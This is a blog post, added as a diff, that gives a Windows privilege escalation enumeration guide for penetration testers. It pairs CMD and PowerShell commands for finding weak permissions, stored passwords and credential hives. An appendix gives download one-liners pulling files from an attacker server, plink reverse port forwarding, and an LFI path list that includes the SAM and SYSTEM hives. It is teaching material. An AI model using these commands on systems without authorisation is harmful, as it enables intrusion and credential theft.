@@ -1,0 +1,545 @@
+---
+layout: post
+title: Windows Privilege Escalation Guide
+tags: [guides]
+---
+
+## Introduction
+
+Privilege escalation always comes down to proper enumeration. But to accomplish proper enumeration you need to know what to check and look for. This takes familiarity with systems that normally comes along with experience. At first privilege escalation can seem like a daunting task, but after a while you start to filter through what is normal and what isn't. It eventually becomes easier to know what to look for rather than digging through everything hoping to find that needle in the haystack. Hopefully this guide will provide a good foundation to build upon and get you started. 
+
+This guide is influenced by [g0tm1lk's Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), which at some point you should have already seen and used. I wanted to try to mirror his guide, except for Windows. So this guide will mostly focus on the enumeration aspect.
+
+_Note: I am not an expert and still learning myself._
+
+### Guide Layout
+
+In each section I first provide the old trusted CMD commands and then also a Powershell equivalent for posterity sake. It's good to have both tools under your belt and Powershell is much more versatile for scripting than the traditional CMD. However there isn't a Powershell equivalent for everything (or CMD is still simply easier/better on certain things), so some sections will only contain regular CMD commands. 
+
+## Operating System
+
+What is the OS and architecture? Is it missing any patches? 
+
+```bat
+systeminfo
+wmic qfe
+```
+
+Is there anything interesting in environment variables? A domain controller in `LOGONSERVER`?
+
+```bat
+set
+```
+
+```powershell
+Get-ChildItem Env: | ft Key,Value
+```
+
+Are there any other connected drives?
+
+```bat
+net use
+wmic logicaldisk get caption,description,providername
+```
+
+```powershell
+Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+```
+
+## Users
+
+Who are you?
+
+```bat
+whoami
+echo %USERNAME%
+```
+
+```powershell
+$env:UserName
+```
+
+What users are on the system? Any old user profiles that weren't cleaned up?
+
+```bat
+net users
+dir /b /ad "C:\Users\"
+dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+```
+
+```powershell
+Get-LocalUser | ft Name,Enabled,LastLogon
+Get-ChildItem C:\Users -Force | select Name
+```
+
+Is anyone else logged in?
+
+```bat
+qwinsta
+```
+
+What groups are on the system?
+
+```bat
+net localgroup
+```
+
+```powershell
+Get-LocalGroup | ft Name
+```
+
+Are any of the users in the Administrators group?
+
+```bat
+net localgroup Administrators
+```
+
+```powershell
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+```
+
+Anything in the Registry for User Autologon?
+
+```bat
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+```
+
+```powershell
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+```
+
+Anything interesting in Credential Manager?
+
+```bat
+ cmdkey /list
+```
+
+Can we access SAM and SYSTEM files?
+
+```
+%SYSTEMROOT%\repair\SAM
+%SYSTEMROOT%\System32\config\RegBack\SAM
+%SYSTEMROOT%\System32\config\SAM
+%SYSTEMROOT%\repair\system
+%SYSTEMROOT%\System32\config\SYSTEM
+%SYSTEMROOT%\System32\config\RegBack\system
+
+```
+
+## Programs, Processes, and Services
+
+What software is installed?
+
+```bat
+dir /a "C:\Program Files"
+dir /a "C:\Program Files (x86)"
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+```
+
+```powershell
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+```
+
+Are there any weak folder or file permissions?
+
+Full Permissions for Everyone or Users on Program Folders?
+
+```bat
+icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 
+
+```
+
+Modify Permissions for Everyone or Users on Program Folders?
+
+```bat
+icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
+
+icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
+icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
+```
+
+```powershell
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
+
+Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} 
+
+```
+
+You can also upload accesschk from Sysinternals to check for writeable folders and files.
+
+```bat
+accesschk.exe -qwsu "Everyone" *
+accesschk.exe -qwsu "Authenticated Users" *
+accesschk.exe -qwsu "Users" *
+```
+
+What are the running processes/services on the system? Is there an inside service not exposed? If so, can we open it? _See Port Forwarding in Appendix._
+
+```bat
+tasklist /svc
+tasklist /v
+net start
+sc query
+```
+
+```powershell
+Get-Process | ft ProcessName,Id
+Get-Service
+```
+
+Any weak service permissions? Can we reconfigure anything? Again, upload accesschk.
+
+```bat
+accesschk.exe -uwcqv "Everyone" *
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -uwcqv "Users" *
+```
+
+Are there any unquoted service paths?
+
+```bat
+wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
+```
+
+What scheduled tasks are there? Anything custom implemented?
+
+```bat
+schtasks /query /fo LIST 2>nul | findstr TaskName
+dir C:\windows\tasks
+```
+
+```powershell
+Get-ScheduledTask | ft TaskName, State
+```
+
+What is ran at startup?
+
+```
+wmic startup get caption,command
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+
+```
+
+```powershell
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+get-childitem "C:\Users\All Users\Start Menu\Programs\Startup"
+get-childitem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+```
+
+
+Is AlwaysInstallElevated enabled? _I have not ran across this but it doesn't hurt to check._
+
+```bat
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+## Networking
+
+What NICs are connected? Are there multiple networks?
+
+```bat
+ipconfig /all
+```
+
+```powershell
+Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
+```
+
+What routes do we have?
+
+```bat
+route print
+```
+
+```powershell
+Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
+```
+
+Anything in the ARP cache?
+
+```bat
+arp -a
+```
+
+```powershell
+Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
+```
+
+Are there connections to other hosts?
+
+```bat
+netstat -ano
+```
+
+Anything in the hosts file?
+
+```
+C:\WINDOWS\System32\drivers\etc\hosts
+```
+
+Is the firewall turned on? If so what's configured?
+
+```bat
+netsh firewall show state
+netsh firewall show config
+netsh advfirewall firewall show rule name=all
+netsh advfirewall export "firewall.txt"
+```
+
+Any other interesting interface configurations?
+
+```bat
+netsh dump
+```
+
+Are there any SNMP configurations?
+
+```bat
+reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+```
+
+```powershell
+Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+```
+
+## Interesting Files and Sensitive Information
+
+This section may be a little noisy so you may want to output commands into txt files to review and parse as you wish.
+
+Any passwords in the registry?
+
+```bat
+reg query HKCU /f password /t REG_SZ /s
+reg query HKLM /f password /t REG_SZ /s 
+```
+
+Are there sysprep or unattend files available that weren't cleaned up?
+
+```bat
+dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
+```
+
+```powershell
+Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
+```
+
+If the server is an IIS webserver, what's in inetpub? Any hidden directories? web.config files?
+
+```bat
+dir /a C:\inetpub\
+dir /s web.config
+C:\Windows\System32\inetsrv\config\applicationHost.config
+```
+
+```powershell
+Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+```
+
+
+What's in the IIS Logs?
+
+```
+C:\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\W3SVC2\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC1\u_ex[YYMMDD].log
+C:\inetpub\logs\LogFiles\FTPSVC2\u_ex[YYMMDD].log
+```
+
+Is XAMPP, Apache, or PHP installed? Any there any XAMPP, Apache, or PHP configuration files? 
+
+```bat
+dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnf
+```
+
+```powershell
+Get-Childitem –Path C:\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Any Apache web logs? 
+
+```bat
+dir /s access.log error.log
+```
+
+```powershell
+Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Any interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?
+
+```bat
+dir /s *pass* == *vnc* == *.config* 2>nul
+```
+
+```powershell
+Get-Childitem –Path C:\Users\ -Include *password*,*vnc* -File -Recurse -ErrorAction SilentlyContinue
+```
+
+Files containing password inside them?
+
+```bat
+findstr /si password *.xml *.ini *.txt *.config 2>nul
+```
+
+```powershell
+Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
+```
+
+# Appendix
+## Transferring Files
+
+At some point during privilege escalation you will need to get files onto your target. Below are some easy ways to do so.
+
+Powershell Cmdlet (Powershell 3.0 and higher)
+
+```powershell
+Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename"
+```
+
+Powershell One-Liner 
+
+```powershell
+(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") 
+```
+
+Powershell Script
+
+```powershell
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://IPADDRESS/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+		
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+```
+
+Non-interactive FTP via text file. _Useful for when you only have limited command execution._
+
+```bat
+echo open 10.10.10.11 21> ftp.txt
+echo USER username>> ftp.txt
+echo mypassword>> ftp.txt
+echo bin>> ftp.txt
+echo GET filename>> ftp.txt
+echo bye>> ftp.txt
+		
+ftp -v -n -s:ftp.txt
+```
+
+CertUtil
+
+```bat
+certutil.exe -urlcache -split -f https://myserver/filename outputfilename
+```
+
+## Port Forwarding
+
+This is useful for exposing inside services that aren't available from outside the machine, normally due to firewall settings.
+
+Upload `plink.exe` to target.
+
+Start SSH on your attacking machine.
+
+For example to expose SMB, on the target run:
+
+```bat
+plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
+```
+_Note: As of the Fall Creators Update for Windows 10, OpenSSH has been introduced in beta for Windows, so I expect one day we may be able to use just regular old SSH commands for port forwarding, depending on if it's enabled._
+
+## Local File Inclusion List
+
+This is not an exhaustive list, installation directories will vary, I've only listed common ones.
+
+```
+C:\Apache\conf\httpd.conf
+C:\Apache\logs\access.log
+C:\Apache\logs\error.log
+C:\Apache2\conf\httpd.conf
+C:\Apache2\logs\access.log
+C:\Apache2\logs\error.log
+C:\Apache22\conf\httpd.conf
+C:\Apache22\logs\access.log
+C:\Apache22\logs\error.log
+C:\Apache24\conf\httpd.conf
+C:\Apache24\logs\access.log
+C:\Apache24\logs\error.log
+C:\Documents and Settings\Administrator\NTUser.dat
+C:\php\php.ini
+C:\php4\php.ini
+C:\php5\php.ini
+C:\php7\php.ini
+C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache\logs\error.log
+C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
+C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
+c:\Program Files (x86)\php\php.ini"
+C:\Program Files\Apache Group\Apache\conf\httpd.conf
+C:\Program Files\Apache Group\Apache\conf\logs\access.log
+C:\Program Files\Apache Group\Apache\conf\logs\error.log
+C:\Program Files\Apache Group\Apache2\conf\httpd.conf
+C:\Program Files\Apache Group\Apache2\conf\logs\access.log
+C:\Program Files\Apache Group\Apache2\conf\logs\error.log
+C:\Program Files\FileZilla Server\FileZilla Server.xml
+C:\Program Files\MySQL\my.cnf
+C:\Program Files\MySQL\my.ini
+C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.0\my.ini
+C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.1\my.ini
+C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.5\my.ini
+C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.6\my.ini
+C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
+C:\Program Files\MySQL\MySQL Server 5.7\my.ini
+C:\Program Files\php\php.ini
+C:\Users\Administrator\NTUser.dat
+C:\Windows\debug\NetSetup.LOG
+C:\Windows\Panther\Unattend\Unattended.xml
+C:\Windows\Panther\Unattended.xml
+C:\Windows\php.ini
+C:\Windows\repair\SAM
+C:\Windows\repair\system
+C:\Windows\System32\config\AppEvent.evt
+C:\Windows\System32\config\RegBack\SAM
+C:\Windows\System32\config\RegBack\system
+C:\Windows\System32\config\SAM
+C:\Windows\System32\config\SecEvent.evt
+C:\Windows\System32\config\SysEvent.evt
+C:\Windows\System32\config\SYSTEM
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\winevt\Logs\Application.evtx
+C:\Windows\System32\winevt\Logs\Security.evtx
+C:\Windows\System32\winevt\Logs\System.evtx
+C:\Windows\win.ini 
+C:\xampp\apache\conf\extra\httpd-xampp.conf
+C:\xampp\apache\conf\httpd.conf
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+C:\xampp\FileZillaFTP\FileZilla Server.xml
+C:\xampp\MercuryMail\MERCURY.INI
+C:\xampp\mysql\bin\my.ini
+C:\xampp\php\php.ini
+C:\xampp\security\webdav.htpasswd
+C:\xampp\sendmail\sendmail.ini
+C:\xampp\tomcat\conf\server.xml
+```
